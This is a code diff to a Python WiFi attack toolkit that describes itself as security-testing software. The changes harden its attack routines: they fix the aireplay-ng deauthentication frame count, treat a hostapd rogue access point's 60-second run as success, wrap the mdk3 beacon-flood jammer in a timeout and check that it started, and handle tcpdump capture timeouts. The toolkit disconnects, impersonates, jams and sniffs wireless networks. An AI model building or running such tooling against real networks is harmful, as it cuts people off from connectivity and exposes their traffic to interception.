@@ -4,6 +4,7 @@ Advanced WiFi security testing and device disconnection functionality.
 WARNING: Only use on networks you own or have explicit permission to test.
 """
 
+import atexit
 import logging
 import os
 import platform
@@ -210,7 +211,9 @@ class WiFiDeauthenticator:
         try:
             try:
                 # airodump-ng runs until killed; the timeout ending it is
-                # the normal path, not an error.
+                # the normal path, not an error. Its chatty stdout goes to
+                # DEVNULL -- it would otherwise accumulate in memory for
+                # the whole scan; the networks come from the CSV files.
                 subprocess.run(
                     [
                         "sudo",
@@ -223,8 +226,8 @@ class WiFiDeauthenticator:
                         str(duration),
                         interface,
                     ],
-                    capture_output=True,
-                    text=True,
+                    stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL,
                     timeout=duration + 5,
                 )
             except subprocess.TimeoutExpired:
@@ -311,13 +314,22 @@ class WiFiDeauthenticator:
         )
 
         try:
+            # Clamp the frame count to a positive int. aireplay-ng treats
+            # "--deauth 0" as *continuous* mode, so a zero/negative count
+            # would silently change the attack's behavior.
+            try:
+                packet_count = int(target.packet_count)
+            except (TypeError, ValueError):
+                packet_count = 64
+            packet_count = max(1, packet_count)
+
             # Send deauth frames using aireplay-ng
             result = subprocess.run(
                 [
                     "sudo",
                     "aireplay-ng",
                     "--deauth",
-                    str(target.packet_count),
+                    str(packet_count),
                     "-a",
                     target.gateway_mac,
                     "-c",
@@ -332,7 +344,7 @@ class WiFiDeauthenticator:
             if result.returncode == 0:
                 self.logger.info(
                     f"Deauthentication sent to {target.mac_address} "
-                    f"({target.packet_count} frames)"
+                    f"({packet_count} frames)"
                 )
                 return True
             else:
@@ -431,16 +443,30 @@ class WiFiDeauthenticator:
                 with open(hostapd_conf, "w") as f:
                     f.write(config)
 
-                result = subprocess.run(
-                    ["sudo", "hostapd", hostapd_conf], capture_output=True, timeout=60
-                )
-
-                return result.returncode == 0
-            finally:
+                # atexit backstop: if the interpreter exits while hostapd
+                # is running, the config (which holds a live WPA
+                # passphrase) is still removed.
+                atexit_handle = atexit.register(_silent_unlink, hostapd_conf)
                 try:
-                    os.unlink(hostapd_conf)
-                except OSError:
-                    pass
+                    try:
+                        result = subprocess.run(
+                            ["sudo", "hostapd", hostapd_conf],
+                            capture_output=True,
+                            timeout=60,
+                        )
+                    except subprocess.TimeoutExpired:
+                        # hostapd runs in the foreground, so the timeout
+                        # firing is the normal end of the window -- it
+                        # means the AP stayed up for the full 60 seconds.
+                        self.logger.info(
+                            f"Rogue AP '{ssid}' ran for the full 60s window"
+                        )
+                        return True
+                    return result.returncode == 0
+                finally:
+                    atexit.unregister(atexit_handle)
+            finally:
+                _silent_unlink(hostapd_conf)
 
         except Exception as e:
             self.logger.error(f"Error creating rogue AP: {e}")
@@ -483,6 +509,14 @@ wpa_passphrase={passphrase}
 wpa_key_mgmt=WPA-PSK
 wpa_pairwise=CCMP
 """
+
+
+def _silent_unlink(path: str) -> None:
+    """Best-effort file removal; never raises."""
+    try:
+        os.unlink(path)
+    except OSError:
+        pass
 
 
 def _require_single_line(value: str, name: str) -> str:
@@ -530,11 +564,34 @@ class NetworkInterruptor:
         try:
             # Use mdk3 for WiFi jamming; keep the handle so the jammer is
             # always terminated instead of being orphaned after we return.
+            # The `timeout` wrapper is a backstop: if this process is
+            # SIGKILLed before the finally block runs, the root mdk3 still
+            # self-terminates instead of jamming the channel forever.
             proc = subprocess.Popen(
-                ["sudo", "mdk3", interface, "b", "-c", str(channel)],
+                [
+                    "sudo",
+                    "timeout",
+                    str(int(duration) + 5),
+                    "mdk3",
+                    interface,
+                    "b",
+                    "-c",
+                    str(channel),
+                ],
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
             )
+
+            # Verify the jammer actually started: a dead process at t=0
+            # (bad interface, mdk3 missing, driver refusal) means no
+            # jamming is happening even though the command "ran".
+            time.sleep(0.2)
+            if proc.poll() is not None:
+                self.logger.error(
+                    f"mdk3 exited immediately (rc={proc.returncode}); "
+                    "jamming never started"
+                )
+                return False
 
             time.sleep(duration)
             return True
@@ -570,12 +627,23 @@ class NetworkInterruptor:
         fd, pcap_path = tempfile.mkstemp(prefix="shibacuddles_traffic_", suffix=".pcap")
         os.close(fd)
         try:
-            # Use tcpdump to capture traffic
-            subprocess.run(
-                ["sudo", "tcpdump", "-i", interface, "-c", "1000", "-w", pcap_path],
-                capture_output=True,
-                timeout=duration,
-            )
+            # Use tcpdump to capture traffic. `-c 1000` is an upper bound,
+            # not a promise: on a quiet network tcpdump never reaches it
+            # before the timeout ends the capture.
+            try:
+                subprocess.run(
+                    ["sudo", "tcpdump", "-i", interface, "-c", "1000", "-w", pcap_path],
+                    capture_output=True,
+                    timeout=duration,
+                )
+            except subprocess.TimeoutExpired:
+                # Expected on quiet networks: the capture window closed
+                # before 1000 packets arrived. The partial capture on
+                # disk is still usable for stats below.
+                self.logger.info(
+                    f"Traffic capture window ({duration}s) ended before "
+                    "1000 packets arrived; using partial capture"
+                )
 
             # Packet parsing not implemented yet (see docstring).
             stats = {
